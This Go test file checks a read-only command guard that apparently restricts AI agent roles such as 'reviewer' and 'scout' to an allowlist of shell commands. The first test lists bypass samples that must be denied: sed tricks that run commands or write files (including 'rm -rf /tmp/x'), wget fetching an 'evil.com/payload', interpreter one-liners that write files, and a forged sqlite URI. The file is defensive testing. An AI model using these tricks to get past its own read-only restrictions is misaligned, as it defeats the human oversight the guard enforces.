package main

import (
	"strings"
	"testing"
)

// TestReadonlyAllowlist_R4R5Bypasses ensures every agy r4/r5 bypass sample
// for strict read-only roles is denied by the allowlist (default-deny).
func TestReadonlyAllowlist_R4R5Bypasses(t *testing.T) {
	t.Setenv(auditEnvRole, "reviewer")
	t.Setenv(auditEnvReadonly, "")

	cases := []struct {
		name string
		argv []string
		code string
	}{
		// sed bypasses (r4/r5)
		{name: "sed multiline e", code: "sed -n $'1p\\ne rm -rf /tmp/x' /etc/hosts"},
		{name: "sed multiline e pig", code: "sed -n $'1p\\ne pig' /etc/hosts"},
		{name: "sed multiline s e", code: "sed -n $'1p\\ns/.*/pig/e' /etc/hosts"},
		{name: "sed charclass w", argv: []string{"sed", "/[[:alpha:]/]/w /tmp/pwn"}},
		{name: "sed charclass e", argv: []string{"sed", "/[[:alpha:]/]/e pig"}},
		{name: "sed s class w", argv: []string{"sed", "s/[/]//x/w /tmp/pwn"}},
		{name: "sed s class e", argv: []string{"sed", "s/[/]//pig/e"}},
		{name: "sed y then w", argv: []string{"sed", "y|;/|ab|;w /tmp/pwn"}},
		{name: "sed brace w", argv: []string{"sed", "{/a/p}w /tmp/pwn"}},
		{name: "sed brace e", argv: []string{"sed", "{/a/p}e pig"}},
		{name: "sed Mw", argv: []string{"sed", `/root/Mw /tmp/out`}},
		{name: "sed Iw", argv: []string{"sed", `\|root|Iw /tmp/out`}},
		{name: "sed Ie", argv: []string{"sed", "-n", `\|root|Ie pig`}},

		// wget — not allowlisted at all
		{name: "wget spider", argv: []string{"wget", "--spider", "https://x"}},
		{name: "wget -O -", argv: []string{"wget", "-O", "-", "https://x"}},
		{name: "wget after --", argv: []string{"wget", "https://evil.com/payload", "--", "--spider"}},
		{name: "wget -e", argv: []string{"wget", "--spider", "-e", "spider=off", "https://x"}},
		{name: "wget -AV", argv: []string{"wget", "-AV", "https://evil.com/x"}},

		// interpreters
		{name: "python -c write", argv: []string{"python3", "-c", "open('/tmp/x','w').write('1')"}},
		{name: "python -c harmless", argv: []string{"python3", "-c", "print(1)"}},
		{name: "node -e write", argv: []string{"node", "-e", "fs.writeFileSync('/tmp/x','1')"}},
		{name: "node -e harmless", argv: []string{"node", "-e", "console.log(1)"}},
		{name: "awk program", argv: []string{"awk", "{print $1}", "f"}},
		{name: "perl -e", argv: []string{"perl", "-e", "print 1"}},

		// sqlite URI tricks
		{name: "sqlite no readonly", argv: []string{"sqlite3", "/tmp/x.db", "select 1"}},
		{name: "sqlite uri mode forge", argv: []string{"sqlite3", "file:/tmp/pwn.db?mode=ro&mode=rwc", "select 1"}},

		// structural bans
		{name: "eval", argv: []string{"eval", "echo ok"}},
		{name: "exec", argv: []string{"exec", "ls"}},
		{name: "source", code: "source ./env.sh"},
		{name: "dot source", code: ". ./env.sh"},
		{name: "background", code: "ls &"},
		{name: "cmdsubst", code: "echo $(ls)"},
		{name: "find -exec", argv: []string{"find", ".", "-exec", "grep", "foo", "{}", "+"}},
		{name: "git -c", argv: []string{"git", "-c", "a=b", "diff"}},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			var got string
			if tc.code != "" {
				got = guardShellReadonly(tc.code)
			} else {
				got = guardArgvReadonly(tc.argv)
			}
			if got == "" {
				t.Fatalf("expected block, got empty (argv=%v code=%q)", tc.argv, tc.code)
			}
			if !strings.Contains(got, "not in readonly allowlist") &&
				!strings.HasPrefix(got, "> ") &&
				got != depthExceededHit {
				// Allow legacy blacklist detail OR allowlist detail.
				// Prefer allowlist, but either form is a block.
				t.Logf("blocked with non-allowlist detail %q (still ok if denied)", got)
			}
		})
	}
}

// TestReadonlyAllowlist_CommonReadsPass allows frequent genuine read ops
// drawn from audit Top commands / starter list.
func TestReadonlyAllowlist_CommonReadsPass(t *testing.T) {
	t.Setenv(auditEnvRole, "scout")
	t.Setenv(auditEnvReadonly, "")

	cases := []struct {
		name string
		argv []string
		code string
	}{
		{name: "ls", argv: []string{"ls", "-la", "/tmp"}},
		{name: "cat", argv: []string{"cat", "/etc/hosts"}},
		{name: "head", argv: []string{"head", "-n", "20", "f"}},
		{name: "tail", argv: []string{"tail", "-n", "5", "f"}},
		{name: "wc", argv: []string{"wc", "-l", "f"}},
		{name: "rg", argv: []string{"rg", "-n", "foo", "."}},
		{name: "grep", argv: []string{"grep", "-n", "foo", "f"}},
		{name: "find name", argv: []string{"find", ".", "-name", "*.go", "-print"}},
		{name: "stat", argv: []string{"stat", "f"}},
		{name: "file", argv: []string{"file", "f"}},
		{name: "du", argv: []string{"du", "-sh", "."}},
		{name: "df", argv: []string{"df", "-h"}},
		{name: "pwd", argv: []string{"pwd"}},
		{name: "echo", argv: []string{"echo", "hi"}},
		{name: "printf", argv: []string{"printf", "%s", "hi"}},
		{name: "true", argv: []string{"true"}},
		{name: "which", argv: []string{"which", "ls"}},
		{name: "date", argv: []string{"date", "-u"}},
		{name: "sort", argv: []string{"sort", "f"}},
		{name: "uniq", argv: []string{"uniq", "f"}},
		{name: "cut", argv: []string{"cut", "-d:", "-f1", "f"}},
		{name: "tr", argv: []string{"tr", "a-z", "A-Z"}},
		{name: "jq", argv: []string{"jq", ".", "f.json"}},
		{name: "diff", argv: []string{"diff", "-u", "a", "b"}},
		{name: "realpath", argv: []string{"realpath", "f"}},
		{name: "basename", argv: []string{"basename", "a/b"}},
		{name: "dirname", argv: []string{"dirname", "a/b"}},
		{name: "git status", argv: []string{"git", "status"}},
		{name: "git log", argv: []string{"git", "log", "-3"}},
		{name: "git show", argv: []string{"git", "show", "HEAD"}},
		{name: "git diff", argv: []string{"git", "diff"}},
		{name: "git branch list", argv: []string{"git", "branch", "-a"}},
		{name: "git tag list", argv: []string{"git", "tag", "-l"}},
		{name: "git -C status", argv: []string{"git", "-C", "/tmp", "status"}},
		{name: "sed -n p", argv: []string{"sed", "-n", "1,20p", "f"}},
		{name: "strings", argv: []string{"strings", "/bin/ls"}},
		{name: "ps", argv: []string{"ps", "aux"}},
		{name: "systemctl status", argv: []string{"systemctl", "status", "x"}},
		{name: "journalctl", argv: []string{"journalctl", "-u", "x", "-n", "30", "--no-pager"}},
		{name: "go version", argv: []string{"go", "version"}},
		{name: "go env", argv: []string{"go", "env"}},
		{name: "gofmt -d", argv: []string{"gofmt", "-d", "x.go"}},
		{name: "pipe", code: "ls /tmp | head -n 5"},
		{name: "and", code: "git status && git log -1"},
		{name: "devnull", code: "ls /tmp 2>/dev/null"},
		{name: "herdr pane read", argv: []string{"herdr", "pane", "read", "w1:p1"}},
		{name: "git config --get", argv: []string{"git", "config", "--get", "user.name"}},
		{name: "git remote -v", argv: []string{"git", "remote", "-v"}},
		{name: "git worktree list", argv: []string{"git", "worktree", "list"}},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			var got string
			if tc.code != "" {
				got = guardShellReadonly(tc.code)
			} else {
				got = guardArgvReadonly(tc.argv)
			}
			if got != "" {
				t.Fatalf("expected allow, got %q (argv=%v code=%q)", got, tc.argv, tc.code)
			}
		})
	}
}

// TestReadonlyAllowlist_VerifierUnchanged documents that verifier is outside
// the strict allowlist path (auditCallerIsStrictReadonly excludes it).
func TestReadonlyAllowlist_VerifierUnchanged(t *testing.T) {
	t.Setenv(auditEnvRole, "verifier")
	t.Setenv(auditEnvReadonly, "1")
	// verifier is readonly but not strict — allowlist must not apply.
	if auditCallerIsStrictReadonly() {
		t.Fatal("verifier must not be strict readonly")
	}
	g := currentGuardCall()
	if g.strictReadonly {
		t.Fatal("verifier guardCall must not be strictReadonly")
	}
}
